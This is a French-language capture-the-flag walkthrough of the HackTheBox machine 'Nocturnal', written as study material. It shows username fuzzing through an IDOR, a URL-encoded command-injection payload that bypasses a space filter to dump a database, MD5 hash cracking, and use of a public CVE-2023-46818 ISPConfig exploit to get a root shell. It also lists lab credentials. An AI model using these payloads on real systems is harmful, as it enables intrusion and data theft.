---
title: HTB | Nocturnal
description: Nocturnal is a medium-difficulty Linux machine demonstrating an IDOR vulnerability in a PHP web application, allowing access to other users uploaded files. Credentials are retrieved to log in to the admin panel, where the application's source code is accessed. A command injection vulnerability is identified, providing a reverse shell as the www-data user. Password hashes are extracted from a SQLite database and cracked to obtain SSH access as the tobias user. Exploiting CVE-2023-46818 in the ISPConfig application grants remote command execution, leading to privilege escalation to the root user.
slug: nocturnal-htb
date: 2025-04-16 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Nocturnal cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Nocturnal</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.64</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
amanda : arHkG7HAI68X8s1J
tobias : slowmotionapocalypse

## ISPConfig Dashboard
admin : slowmotionapocalypse
```

## SystemInfo
```bash
Ubuntu 20.04.6 LTS (Focal Fossa)
```

## Enumeration
```bash
$ nmap -sC -sV -An -p- -vvv -T4 10.10.11.64            

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

## Foothold

### File upload
On trouve un site web, on peut s'inscrire et poster des fichiers. Avec beaucoup de recherche, je ne trouve pas de faille pour uploader un shell par exemple et executer du code php. Rien ne semble vulnérable.

En téléchargeant mes propres fichiers, et en analysant la requete effectué avec Burp. Je découvre qu'il est possible de vérifier si un utilisateur existe ou non. En plus, si il existe, et qu'on précise un mauvais fichier pour l'upload, il nous propose les autres fichiers disponibles pour cet utilisateur !

Dans un premier et j'ai fait une requete Burp. Lorsqu'un utilisateur est mauvais, j'ai vu que la taille de la requete était de **2985**octets. Information importante pour pouvoir fuzzer ensuite les usernames. En effet, si la reponse a ma requete est différente de cette taille, alors il est probable que l'utilisateur existe.

Je mets la requete a effectué pour fuzzer les noms d'utilisateur, avec le mot clé "FUZZ" au bon endroit :
```bash
~/github/Hacking/HackTheBox/Machines/Linux/Easy/Nocturnal (main*) » cat dl.req                                               
GET /view.php?username=FUZZ&file=a.pdf HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://nocturnal.htb/dashboard.php
Cookie: PHPSESSID=u9iupob4f8khh30retevlt8gc6
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
J'utilise ensuite l'outil **ffuf** avec une liste de usernames de seclists. Je précise le parametre **-fs 2985** qui affiche donc les utilisateurs uniquement si la reponse renvoyé a une taille différente de 2985. Pour faire "egale", on aurait écrit "-ms" :
```bash
~/github/Hacking/HackTheBox/Machines/Linux/Easy/Nocturnal (main*) » ffuf -request dl.req -request-proto http -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -fs 2985 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=a.pdf
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Cookie: PHPSESSID=u9iupob4f8khh30retevlt8gc6
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Host: nocturnal.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://nocturnal.htb/dashboard.php
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 26ms]
hello                   [Status: 200, Size: 3118, Words: 1175, Lines: 129, Duration: 21ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 20ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 19ms]
```
On trouve plusieurs usernames, dont amanda qui est correct et contient un fichier privacy avec un mot de passe a l'interieur:
```bash
GET /view.php?username=amanda&file=privacy.odt HTTP/1.1
Host: nocturnal.htb
...

--------------

Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

### Amanda - Admin Dashboard
On peut creer une backup des fichiers. On peut injecter des commandes dans le champs permettant de préciser le mot de passe du zip. L'idée est de bypasser le filtre qui interdit les espaces, ';' etc..
En utilisant "%09" on peut bypasser le filtre et mettre des espaces ! Attention a toujours tester ce genre de choses dans Burp !! En faisant directement dans la part
```bash
POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=h28ba7dgkhrqt67c0ktleof1d1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=%0Abash%09-c%09"base64%09/var/www/nocturnal_database/nocturnal_database.db"%0A&backup=
```

### nocturnal.db
On peut maintenant dumper la db et casser le hachage du mot de passe de :
```bash
~/github/Hacking/HackTheBox/Machines/Linux/Easy/Nocturnal (main*) » sqlite3 ~/Téléchargements/download.sqlite 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
uploads  users  
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|test|098f6bcd4621d373cade4e832627b4f6
```

```bash
~/github/Hacking/HackTheBox/Machines/Linux/Easy/Nocturnal (main*) » hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 55c82b1ccd55ab219b3b109b07d5061d
Time.Started.....: Wed Apr 16 14:57:40 2025 (1 sec)
Time.Estimated...: Wed Apr 16 14:57:41 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 12149.4 kH/s (4.50ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4128768/14344385 (28.78%)
Rejected.........: 0/4128768 (0.00%)
Restore.Point....: 3538944/14344385 (24.67%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: stefy06 -> ruddsound1
Hardware.Mon.#1..: Temp: 35c Fan: 46% Util: 29% Core:1544MHz Mem:3802MHz Bus:16

Started: Wed Apr 16 14:57:29 2025
Stopped: Wed Apr 16 14:57:42 2025
~/github/Hacking/HackTheBox/Machines/Linux/Easy/Nocturnal (main*) » hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```

```bash
~/github/Hacking/HackTheBox/Machines/Linux/Easy/Nocturnal (main*) » ssh -L 8888:localhost:8080 tobias@nocturnal.htb
tobias@nocturnal.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)
...

Last login: Wed Apr 16 12:59:25 2025 from 10.10.14.10
tobias@nocturnal:~$ ls
user.txt
tobias@nocturnal:~$ cat user.txt 
7922.....0dd3
```

## Privilege Escalation

### netstat -ano - port forwarding 8080
On découvre un port 8080 ouvert uniquement de l'interieur. On decide de faire du port forwarding pour voir la page web sur notre navigateur:
```bash
ssh -L 8888:localhost:8080 tobias@nocturnal.htb
```

### ISPConfig 3.2.10p1
On découvre une page web "ISPConfig"
On peut se connecter au compte "admin" avec le mot de passe de tobias "slowmotionapocalypse". On trouve un dashboard et on identifie la version "3.2.10p1".

### Exploit : Authenticated RCE ISPConfig
Avec searchsploit, on ne trouve que d'anciennes vulnérabilités. Cependant, sur google on trouve un lien vers un POC qui semble plus récent :
https://packetstorm.news/files/id/176126

"ISPConfig versions 3.2.11 and below suffer from a PHP code injection vulnerability in language_edit.php."

On observe ici le parametre "lang_file" qui est injectable.
```bash
curl_setopt($ch, CURLOPT_URL, "{$url}admin/language_edit.php");
curl_setopt($ch, CURLOPT_POSTFIELDS, "lang=en&module=help&lang_file={$lang_file}");
```

En utilisant le POC, et les credentials admin, on obtient directement un shell en tant que root :
```bash
» php exploit.php http://localhost:8888/ admin slowmotionapocalypse
------------------------------------------------------------------------
ISPConfig <= 3.2.11 (language_edit.php) PHP Code Injection Vulnerability
------------------------------------------------------------------------


[-] Software Link:

https://www.ispconfig.org


[-] Affected Versions:

Version 3.2.11 and prior versions.


[-] Vulnerabilities Description:

User input passed through the "records" POST parameter to
/admin/language_edit.php is not properly sanitized before being used
to dynamically generate PHP code that will be executed by the
application. This can be exploited by malicious administrator users to
inject and execute arbitrary PHP code on the web server.


[-] Proof of Concept:

https://karmainsecurity.com/pocs/CVE-2023-46818.php
(Packet Storm Editor Note: See bottom of this file for PoC)


[-] Solution:

Upgrade to version 3.2.11p1 or later.


[-] Disclosure Timeline:

[25/10/2023] - Vendor notified
[26/10/2023] - Version 3.2.11p1 released
[27/10/2023] - CVE identifier assigned
[07/12/2023] - Publication of this advisory


[-] CVE Reference:

The Common Vulnerabilities and Exposures project (cve.mitre.org)
has assigned the name CVE-2023-46818 to this vulnerability.


[-] Credits:

Vulnerability discovered by Egidio Romano.


[-] Original Advisory:

https://karmainsecurity.com/KIS-2023-13


[-] Other References:

https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/



--- CVE-2023-46818.php PoC ---

[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# whoami
root

ispconfig-shell# cat /root/root.txt
9b18.....21bf
```

## Tips

- J'ai découvert qu'on pouvait vérifier facilement si un utilisateur existait en faisant une requete specifique. J'ai meme pensé à faire un Fuzz, eventuellement avec Burp Sniper ou un autre outil. Je n'ai pas essayé et je suis aller voir le write up... C'était bien ça la solution...

- Lorsqu'on trouve une entrée utilisateur injectable, toujours faire des tests dans BURP !! Ou avec curl (à la rigueur). Mais jamais directement sur la page web. Ici, il fallait utilisé %0a pour remplacer un caractère espace. Le problème c'est que ca n'a pas fonctionné car c'était remplacé par "%XX%XX" avec d'autre valeur a cause de l'URL encoding. Attention donc a bien testé les parametres injectables directement dans BURP pour eviter qu'il y ait un URL encoding qui s'applique sans qu'on le sache.